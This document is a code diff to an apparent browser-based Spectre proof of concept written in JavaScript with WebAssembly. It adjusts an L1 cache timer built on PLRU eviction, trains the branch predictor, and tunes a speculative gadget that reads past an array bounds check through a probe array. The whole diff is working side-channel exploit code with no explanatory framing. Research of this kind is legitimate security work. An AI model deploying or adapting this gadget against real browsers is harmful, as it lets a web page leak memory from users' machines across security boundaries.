@@ -5,7 +5,7 @@ const PAGE_SZ = 16 * 1024;
 const CACHE_LINES_PER_PAGE = 256;
 const CACHE_WAYS = 8;
 const CACHE_LINE_SZ = 64;
-const L1_REPS = 40000;
+const L1_REPS = 4000;
 
 class L1Timer {
     constructor(callback) {
@@ -36,12 +36,13 @@ class L1Timer {
 
     _timeL1(cacheSet, clearSet) {
         // New construct: spin until next clock edge hits.
-        const edge = Math.floor(performance.now());
-        while (Math.floor(performance.now()) == edge) { }
+        // const edge = Math.floor(performance.now());
+        // while (Math.floor(performance.now()) == edge) { }
 
         // Another construct: floor to performance.now() because
         // rounding can sometimes result in imprecise decimals
-        const start = Math.floor(performance.now());
+        // const start = Math.floor(performance.now());
+        const start = performance.now();
         this.wasm.exports.oscillateTreePLRU2(
             L1_REPS,
             cacheSet[0],
@@ -61,7 +62,8 @@ class L1Timer {
             clearSet[6],
             clearSet[7]
         );
-        const end = Math.floor(performance.now());
+        // const end = Math.floor(performance.now());
+        const end = performance.now();
         return end - start;
     }
 
@@ -178,10 +180,10 @@ function spectreGadget(trash) {
 
     // Add a loop to control the state of the branch predictor
     // I.e. we want the last n branches taken/not taken to be consistent
-    for (let i = 0; i < 50; i++);
+    for (let i = 0; i < 200; i++);
 
     // PLRU + speculation: probeArray[0] will be evicted from L1
-    return probeArray[idx < probeArray[0] ? 0x2040 : 0x400];
+    return probeArray[idx < probeArray[0] ? SET << 6 : 0x400];
 }
 
 const spectreTimer = new L1Timer(spectreGadget);
@@ -197,6 +199,8 @@ function testBit(cond) {
     for (let j = 0; j < 2; j++) {
         spectreGadget();
     }
+
+    probeArray[0];
 
     // Try to evict the length field of our array from memory, so that we can
     // speculate over the length check if the argument is true.
